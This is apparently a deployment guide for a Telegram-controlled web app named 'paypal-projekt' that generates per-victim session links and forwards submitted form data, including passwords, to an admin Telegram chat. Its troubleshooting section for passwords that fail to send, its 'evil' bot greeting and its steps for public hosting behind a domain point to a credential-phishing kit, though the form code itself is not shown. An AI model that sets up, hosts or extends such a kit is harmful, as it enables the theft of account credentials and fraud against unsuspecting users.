# Getting Started Guide

This guide will help you set up and run the Telegram Bot-Controlled React App project.

## Prerequisites

- Node.js (v14 or higher)
- npm (v6 or higher)
- A Telegram account
- A Telegram bot token (obtained from BotFather)

## Step 1: Create a Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Start a chat with BotFather and send `/newbot`
3. Follow the instructions to create a new bot
4. Once created, BotFather will give you a token. Save this token for later use.

## Step 2: Get Your Chat IDs

### For Admin Chat ID:
1. Open Telegram and search for `@userinfobot`
2. Start a chat with this bot
3. The bot will reply with your Chat ID. Save this ID as your `ADMIN_CHAT_ID`.

### For Group Chat ID:
1. Create a group in Telegram
2. Add your bot to the group and make it an admin
3. Run the provided script to get the group chat ID:
   ```
   node get-chat-id.js
   ```
4. Send `/getchatid` in the group
5. The bot will respond with the group chat ID. Save this as your `GROUP_CHAT_ID`.

## Step 3: Configure Environment Variables

1. In the project root directory, edit the `.env` file:
   ```
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   ADMIN_CHAT_ID=your_chat_id
   GROUP_CHAT_ID=your_group_chat_id
   PORT=3000
   NODE_ENV=development
   ```

## Step 4: Set Up the Project

Run the setup script to install dependencies and initialize the database:

```
npm run setup
```

Alternatively, you can run these commands manually:

```
npm install
cd client && npm install
npm run init-db
```

## Step 5: Test the Telegram Bot

To verify that your Telegram bot is working correctly:

```
npm run test-bot
```

Then, open Telegram and send a message to your bot. You should see a response.

Try the following commands:
- `/start` - Get a welcome message
- `/help` - See available commands
- `/hello` - Get a special "evil" greeting

## Step 6: Start the Development Server

To start both the frontend and backend servers:

```
npm run dev
```

This will start:
- Backend server at http://localhost:3000
- Frontend development server at http://localhost:5173

## Step 7: Generate a Session Link

1. In Telegram, send `/new` to your bot
2. The bot will respond with a unique URL
3. Open this URL in your browser to start the form flow

## Project Structure

- `/client` - React frontend (Vite)
- `/server` - Node.js + Express backend
- `/server/bot` - Telegram bot integration
- `/server/db` - Database models and migrations
- `/data` - SQLite database files

## Available Scripts

- `npm run dev` - Start development servers
- `npm run server` - Start only the backend server
- `npm run client` - Start only the frontend server
- `npm run build` - Build the frontend for production
- `npm start` - Start the production server
- `npm run init-db` - Initialize the database
- `npm run test-bot` - Test the Telegram bot connection

## Troubleshooting

### Bot Not Responding
- Check that your `TELEGRAM_BOT_TOKEN` is correct
- Ensure the bot server is running
- Make sure you've stopped any other instances of the bot (use `taskkill /f /im node.exe` on Windows)

### Group Chat Not Working
- Verify that the bot is an admin in the group
- Ensure you've set the correct `GROUP_CHAT_ID` in the `.env` file
- Run the `get-chat-id.js` script again if needed

### Password Not Being Sent
- Check that the password field is properly included in the form submission
- Verify that the form data is being correctly passed to the Telegram notification

## Next Steps

- Customize the forms to collect the specific data you need
- Enhance the Telegram bot with additional commands
- Add authentication for admin access
- Implement email notifications for form submissions

## Ubuntu 22.04 Server Setup Guide

This section provides instructions for setting up the project on an Ubuntu 22.04 server.

### Option 1: Manual Setup

#### Prerequisites Installation

1. Update your system packages:
   ```bash
   sudo apt update
   sudo apt upgrade -y
   ```

2. Install Node.js and npm:
   ```bash
   sudo apt install -y curl
   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
   sudo apt install -y nodejs
   ```

3. Verify the installation:
   ```bash
   node -v  # Should show v20.x.x
   npm -v   # Should show v9.x.x or higher
   ```

4. Install Git:
   ```bash
   sudo apt install -y git
   ```

#### Project Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/paypal-projekt.git
   cd paypal-projekt
   ```

2. Create and configure the `.env` file:
   ```bash
   cp .env.example .env  # If .env.example exists
   nano .env  # Or use any text editor you prefer
   ```

   Add the following configuration (replace with your actual values):
   ```
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   ADMIN_CHAT_ID=your_chat_id
   GROUP_CHAT_ID=your_group_chat_id
   PORT=3000
   NODE_ENV=production
   ```

3. Install dependencies and set up the project:
   ```bash
   npm run install-all
   npm run init-db
   ```

4. Build the client:
   ```bash
   npm run build
   ```

5. Test the Telegram bot:
   ```bash
   npm run test-bot
   ```

6. Start the production server:
   ```bash
   npm start
   ```

#### Setting Up as a System Service

To ensure your application runs continuously and starts automatically on system boot:

1. Create a systemd service file:
   ```bash
   sudo nano /etc/systemd/system/telegram-form-app.service
   ```

2. Add the following configuration (adjust paths as needed):
   ```
   [Unit]
   Description=Telegram Form Control Application
   After=network.target

   [Service]
   Type=simple
   User=your_username
   WorkingDirectory=/path/to/paypal-projekt
   ExecStart=/usr/bin/node server/index.js
   Restart=on-failure
   Environment=NODE_ENV=production

   [Install]
   WantedBy=multi-user.target
   ```

3. Enable and start the service:
   ```bash
   sudo systemctl enable telegram-form-app
   sudo systemctl start telegram-form-app
   ```

4. Check the service status:
   ```bash
   sudo systemctl status telegram-form-app
   ```

### Option 2: Docker Deployment

#### Prerequisites Installation

1. Update your system packages:
   ```bash
   sudo apt update
   sudo apt upgrade -y
   ```

2. Install Docker and Docker Compose:
   ```bash
   # Install Docker
   sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
   curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
   echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
   sudo apt update
   sudo apt install -y docker-ce docker-ce-cli containerd.io

   # Install Docker Compose
   sudo apt install -y docker-compose-plugin
   ```

3. Add your user to the docker group to run Docker without sudo:
   ```bash
   sudo usermod -aG docker $USER
   ```
   Note: You'll need to log out and back in for this change to take effect.

#### Project Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/paypal-projekt.git
   cd paypal-projekt
   ```

2. Create and configure the `.env` file:
   ```bash
   cp .env.example .env  # If .env.example exists
   nano .env  # Or use any text editor you prefer
   ```

   Add the following configuration (replace with your actual values):
   ```
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   ADMIN_CHAT_ID=your_chat_id
   GROUP_CHAT_ID=your_group_chat_id
   PORT=3000
   NODE_ENV=production
   ```

3. Build and start the Docker containers:
   ```bash
   docker compose up -d
   ```

4. Check the container status:
   ```bash
   docker compose ps
   ```

5. View logs (if needed):
   ```bash
   docker compose logs -f
   ```

### Configuring Nginx as a Reverse Proxy (Optional)

If you want to expose your application to the internet with a domain name and HTTPS:

1. Install Nginx:
   ```bash
   sudo apt install -y nginx
   ```

2. Create a new Nginx configuration file:
   ```bash
   sudo nano /etc/nginx/sites-available/telegram-form-app
   ```

3. Add the following configuration (adjust as needed):
   ```
   server {
       listen 80;
       server_name your-domain.com www.your-domain.com;

       location / {
           proxy_pass http://localhost:3000;
           proxy_http_version 1.1;
           proxy_set_header Upgrade $http_upgrade;
           proxy_set_header Connection 'upgrade';
           proxy_set_header Host $host;
           proxy_cache_bypass $http_upgrade;
       }
   }
   ```

4. Enable the site and restart Nginx:
   ```bash
   sudo ln -s /etc/nginx/sites-available/telegram-form-app /etc/nginx/sites-enabled/
   sudo nginx -t  # Test the configuration
   sudo systemctl restart nginx
   ```

5. Set up SSL with Certbot (recommended):
   ```bash
   sudo apt install -y certbot python3-certbot-nginx
   sudo certbot --nginx -d your-domain.com -d www.your-domain.com
   ```

### Troubleshooting on Ubuntu

#### Permission Issues
- If you encounter permission issues with the data directory:
  ```bash
  sudo chown -R $USER:$USER /path/to/paypal-projekt/data
  ```

#### Port Already in Use
- Check if port 3000 is already in use:
  ```bash
  sudo lsof -i :3000
  ```
- Kill the process if needed:
  ```bash
  sudo kill -9 <PID>
  ```

#### Docker Issues
- If Docker containers fail to start, check logs:
  ```bash
  docker compose logs
  ```
- Restart Docker service if needed:
  ```bash
  sudo systemctl restart docker
  ```

#### Firewall Configuration
- If you're using UFW (Ubuntu's firewall), allow necessary ports:
  ```bash
  sudo ufw allow 80/tcp  # HTTP
  sudo ufw allow 443/tcp  # HTTPS
  sudo ufw reload
  ```
